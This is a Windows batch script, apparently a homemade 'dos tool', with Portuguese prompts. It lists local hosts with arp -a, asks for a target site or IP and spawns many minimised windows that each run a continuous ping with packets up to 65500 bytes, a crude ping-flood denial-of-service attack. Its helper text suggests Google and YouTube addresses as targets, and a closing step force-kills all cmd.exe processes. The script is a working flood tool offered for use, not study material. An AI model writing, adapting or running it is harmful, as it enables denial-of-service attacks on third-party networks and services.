:: or = || and = && 
:: %opcao%,%quandos_cmds%,%tamanho_do_ping%
::val gen

@echo off
set /a quandos_cmds=9
set /a tamanho_do_ping=56
set /a opcao=n
setlocal enabledelayedexpansion
color 02
title dos tool by lendario
chcp 65001 >nul

:start
set /p opcao=quer o helper:    
if %opcao% == s (
  echo helper
  echo 127.*.*.* *=qualquer numero_e_todos_ips_que_comecao_com_127_e_voce_mesmo___________google_=_google.com/8.8.8.8_youtube_=_youtube.com/142.250.72.206___________lembrando_pings_grandes_podem_ser_bloqueado_por_sites_grandes_________NAO_USE_MAIS_DE_15_CMDS_OU_PODERA_TER_ERROS
)

set /p quandos_cmds=Quantos comandos?      
set /p tamanho_do_ping=Tamanho do ping (max 65500):     

:setip
echo ips na sua rede 
arp -a
set /p ip=Digite o site ou IP: 

for /l %%i in (1,1,%quandos_cmds%) do (
  start /min cmd /c "title dos tool by lendario %%i & color 02 & ping %ip% -t -l %tamanho_do_ping%"
  echo %%i° cmd foi aberto
)
timeout 1 > nul
start cmd /c "color 02 & echo enter para fechar tudo & title dos stopper & pause > nul & TASKKILL /F /IM cmd.exe /T"

